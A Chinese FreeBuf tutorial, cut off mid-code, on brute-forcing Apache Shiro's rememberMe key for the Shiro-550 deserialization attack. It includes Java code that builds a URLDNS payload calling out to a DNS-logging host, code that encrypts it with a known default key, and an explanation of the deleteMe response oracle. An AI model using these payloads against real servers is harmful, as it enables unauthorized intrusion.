---
title: 经验分享 | Shiro 密钥爆破
url: https://www.freebuf.com/vuls/415408.html
source: FreeBuf网络安全行业门户
date: 2025-01-08
fetch_date: 2025-10-06T20:10:06.291832
---

# 经验分享 | Shiro 密钥爆破

[![freeBuf](/images/logoMax.png)](/)

主站

分类

云安全

AI安全

开发安全

终端安全

数据安全

Web安全

基础安全

企业安全

关基安全

移动安全

系统安全

其他安全

特色

热点

工具

漏洞

人物志

活动

安全招聘

攻防演练

政策法规

[报告](https://www.freebuf.com/report)[专辑](/column)

* ···
* [公开课](https://live.freebuf.com)
* ···
* [商城](https://shop.freebuf.com)
* ···
* 用户服务
* ···

行业服务

政 府

CNCERT
CNNVD

会员体系（甲方）
会员体系（厂商）
产品名录
企业空间

[知识大陆](https://wiki.freebuf.com/page)

搜索

![](/freebuf/img/7aa3bf7.svg) ![](/freebuf/img/181d733.svg)

创作中心

[登录](https://www.freebuf.com/oauth)[注册](https://www.freebuf.com/oauth)

官方公众号企业安全新浪微博

![](/images/gzh_code.jpg)

FreeBuf.COM网络安全行业门户，每日发布专业的安全资讯、技术剖析。

![FreeBuf+小程序](/images/xcx-code.jpg)

FreeBuf+小程序把安全装进口袋

[![](https://image.3001.net/images/20231020/1697804527_653270ef7570cc7356ba8.png)](https://wiki.freebuf.com)

经验分享 | Shiro 密钥爆破

* ![]()
* 关注

* [漏洞](https://www.freebuf.com/articles/vuls)

经验分享 | Shiro 密钥爆破

2025-01-07 15:31:33

所属地 广东省

# Shiro 密钥爆破

之前的CVE-2016-4437提到过，在shiro-1.2.5及以后，对其进行了修复，密钥不再固定（如果不自己指定的话），而是每次启动时会自动生成一个密钥,那这种情况我们就只需要通过某种方法获取到密钥就可以继续之前的Shiro-550反序列化攻击。

最简单的方法是爆破，但重要的是如何判断我们爆破成功了？

> 不了解cve-2016-4437 看：[shiro550](https://www.freebuf.com/vuls/414754.html)

## DNS回显

根据rememberMe服务可知，只要我们加密的密钥一致，则可以解密出正确数据，然后反序列化。

因此可以想到的思路是用URLDNS链，通过DNS请求的回显判断是否解密成功，从而宣告密钥破解成功

生成序列化数据

```
package com.unserialization.cc;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import utils.reflection.Reflection;
import utils.serialization.Serialization;

/**
 * HashMap.readObject()
 *    HashMap.putVal()
 *       HashMap.hash()
 *          URL.hashCode()
 *              URLStreamHandler.hashCode()
 *                  URLStreamHandler.getHostAddress()
 *                      InetAddress.InetAddress.getByName()
 */

/**
 * Created by dotast on 2022/9/18 22:43
 */
public class URLDNS {
    public static void main(String[] args) throws Exception{
        URLDNS urldns = new URLDNS();
        urldns.serialize();
        //urldns.unserialize();
    }

    public void serialize() throws Exception {
        HashMap map = new HashMap<>();

        URL url = new URL("http://89a1e44b0f.ipv6.1433.eu.org");
        Class cls = Class.forName("java.net.URL");

        //map.put()底层会将 `(key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16)` 作为entry的hash值
        //而url.hashCode() 中如果hashCode = -1 ,进入处理分支会将其值改变，同时会发送DNS请求,干扰观察
        Reflection.setFieldValue(url,"hashCode",666);

        map.put(url, "dotast");

        Reflection.setFieldValue(url, "hashCode", -1);

        Serialization.serialize("1.txt", map);
    }

    public void unserialize() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("1.txt");
        ObjectInputStream in = new ObjectInputStream(fileInputStream);
        in.readObject();
    }

}
```

> Reflection,Serialization是自己写的小封装

利用Shiro的AesCipherService生成remberMe payloads [shiro.version == 1.2.4]

```
package com.unserialization.cb.poc;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.*;

/**
 * Created by dotast on 2022/10/10 10:45
 */
public class Shiro550 {
    public static void main(String[] args) throws Exception {
        String path = "1.txt";

        //这里的key是正确的
        byte[] key = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
        AesCipherService aes = new AesCipherService();
        ByteSource ciphertext = aes.encrypt(getBytes(path), key);
//        System.out.printf(ciphertext.toString());

        try {
            BufferedWriter writer = new BufferedWriter(new FileWriter("output.txt"));
            writer.write("");
            writer.write(ciphertext.toString());
            writer.flush();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
            System.out.println("Error: " + e.getMessage());
        }
    }

    public static byte[] getBytes(String path) throws Exception{
        InputStream inputStream = new FileInputStream(path);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;

    }
}
```

### key正确

我们假设正确key为`kPH+bIxk5D2deZiIxcaaaA==`

#### **实验结果：**

响应：

![image](https://image.3001.net/images/20241115/1731670581_67373235afb32d690d15e.png!small)

> 记住此时响应包中`rememberMe=deleteMe`

控制台：

![image](https://image.3001.net/images/20241115/1731670605_6737324dd187a2640cc52.png!small)

dig.pm

![image](https://image.3001.net/images/20241115/1731670641_6737327198e8bada8b0b9.png!small)

**结果分析**

说明我们的密钥爆破成功

### key错误

我们把密钥改变：`kPH+bIxk5D2deZiIxcaaaA==`-->`2AvVhdsgUs0FSA3SDFAdag==`

![image](https://image.3001.net/images/20241115/1731670663_67373287285e49184096a.png!small)

域名不变

#### **实验结果**

1. 响应
   ![image](https://image.3001.net/images/20241115/1731670689_673732a11bb7db37d5dd8.png!small)
2. 控制台输出：
   ![image](https://image.3001.net/images/20241115/1731670702_673732ae2c93a6a47b913.png!small)
3. dig.pm
   ![image](https://image.3001.net/images/20241115/1731670714_673732ba38f569e7b39d4.png!small)

和之前一样没有任何变化

## shiro自身响应回显

很多情况目标主机很可能不出网，这时DNS回显法失效,故利用shiro本身的响应来判断爆破是否成功

* 经测试，当我们正常使用remberMe服务时，响应中不会出现`rememberMe=deleteMe`

### 什么时候会出现`rememberMe=deleteMe`？

remberMe入口：

```
//AbstractRememberMeManager::
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }
```

可以看到只要不发生异常就不会进入`onRememberedPrincipalFailure(re, subjectContext)`

```
protected PrincipalCollection onRememberedPrincipalFailure(RuntimeException e, SubjectContext context) {
        if (log.isDebugEnabled()) {
            log.debug("...省略...", e);
        }
        forgetIdentity(context);
        //propagate - security manager implementation will handle and warn appropriately
        throw e;
    }
```

进入`forgetIdentity(context);`

```
//CookieRememberMeManager::
public void forgetIdentity(SubjectContext subjectContext) {
        if (WebUtils.isHttp(subjectContext)) {
            HttpServletRequest request = WebUtils.getHttpRequest(subjectContext);
            HttpServletResponse response = WebUtils.getHttpResponse(subjectContext);
            forgetIdentity(request, response);
        }
    }
```

进入`forgetIdentity(request, response)`

```
//CookieRememberMeManager::
private void forgetIdentity(HttpServletRequest request, HttpServletResponse response) {
        getCookie().removeFrom(request, response);
    }
```

![image](https://image.3001.net/images/20241115/1731671129_67373459eee284c0d212c.png!small)

```
public Cookie getCookie() {
        return cookie;
    }
```

进入`SimpleCookie.removeFrom`

```
public void removeFrom(HttpServletRequest request, HttpServletResponse response) {
        String name = getName();
    	//public static final String DELETED_COOKIE_VALUE = "deleteMe"
        String value = DELETED_COOKIE_VALUE;
        String comment = null; //don't need to add extra size to the response - comments are irrelevant for deletions
        String domain = getDomain();
        String path = calculatePath(request);
        int maxAge = 0; //always zero for deletion
        int version = getVersion();
        boolean secure = isSecure();
        bo...